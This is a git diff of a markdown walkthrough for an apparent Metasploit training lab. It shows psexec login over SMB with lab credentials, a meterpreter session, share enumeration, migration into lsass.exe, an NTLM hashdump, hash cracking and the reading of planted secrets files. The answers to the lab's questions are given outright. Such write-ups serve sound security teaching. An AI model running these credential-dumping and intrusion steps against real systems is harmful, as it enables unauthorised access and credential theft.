@@ -229,7 +229,7 @@ Loading extension kiwi...
 Success.
 ```       
 * Running the `help` command after loading a module is always a good idea.
->>> Use the credentials to simulate an initial compromise over SMB (Server Message Block) (using `exploit/windows/smb/psexec`). Username: ballen / password: Password1
+> Use the credentials to simulate an initial compromise over SMB (Server Message Block) (using `exploit/windows/smb/psexec`). Username: ballen / password: Password1
 ```
 root@ip-10-10-159-26:~# msfconsole
 msf6 > use exploit/windows/smb/psexec
@@ -250,8 +250,8 @@ msf6 exploit(windows/smb/psexec) > run
 
 meterpreter >
 ```
-> What is the computer name?
-> What is the target domain?
+1. What is the computer name?
+2. What is the target domain?
 ```
 meterpreter > sysinfo
 Computer    	: ACME-TEST
@@ -262,7 +262,8 @@ Domain      	: FLASH
 Logged On Users : 7
 Meterpreter 	: x86/windows
 ```
-> What is the name of the share likely created by the user?
+3. What is the name of the share likely created by the user?
+> Use the 'post/windows/gather/enum,_shares' module.  Need to background Meterpreter first and sert the SESSION parameter.
 ```	
 CTRL+Z
 Background session 1? [y/N]
@@ -288,7 +289,8 @@ msf6 post(windows/gather/enum_shares) > run
 [*]
 [*] Post module execution completed
 ```
-> What is the NTLM hash of the jchambers user?
+4. What is the NTLM hash of the jchambers user?
+> Need to migrate to the 'lsass.exe' process first, then run 'hashdump'.
 ```	
 meterpreter > ps | grep lsass.exe
 Filtering on 'lsass.exe'
@@ -313,10 +315,10 @@ lnelson:1116:aad3b435b51404eeaad3b435b51404ee:e88186a7bb7980c913dc90c7caa2a3b9::
 erptest:1117:aad3b435b51404eeaad3b435b51404ee:8b9ca7572fe60a1559686dba90726715:::
 ACME-TEST$:1008:aad3b435b51404eeaad3b435b51404ee:c6c85041ee383915bd541ce40b508ff0:::
 ```
-> What is the cleartext password of the jchambers user?
-	
+5. What is the cleartext password of the jchambers user?
+> Use an online hash checker like crackstation.net.	
 Trustno1
-> Where is the "secrets.txt"  file located? (Full path of the file)
+6. Where is the "secrets.txt"  file located? (Full path of the file)
 ```
 meterpreter > search -f secrets.txt
 ound 1 result...
@@ -325,11 +327,15 @@ ound 1 result...
 Path                                                        	Size (bytes)  Modified (UTC)
 ----                                                        	------------  --------------
 c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt  35        	2021-07-30 08:44:27 +0100
-What is the Twitter password revealed in the "secrets.txt" file?
-	meterpreter > cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"
+```
+7. What is the Twitter password revealed in the "secrets.txt" file?
+```
+meterpreter > cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"
 	
 My Twitter password is KDSvbsw3849!
-Where is the "realsecret.txt" file located? (Full path of the file)
+```
+8. Where is the "realsecret.txt" file located? (Full path of the file)
+```
 meterpreter > search -f realsecret.txt
 Found 1 result...
 =================
@@ -337,8 +343,11 @@ Found 1 result...
 Path                           	Size (bytes)  Modified (UTC)
 ----                           	------------  --------------
 c:\inetpub\wwwroot\realsecret.txt  34        	2021-07-30 09:30:24 +0100
-What is the real secret?
-	meterpreter > cat "c:\inetpub\wwwroot\realsecret.txt"
+```
+9. What is the real secret?
+```
+meterpreter > cat "c:\inetpub\wwwroot\realsecret.txt"
 
 The Flash is the fastest man alive
+```
 ```
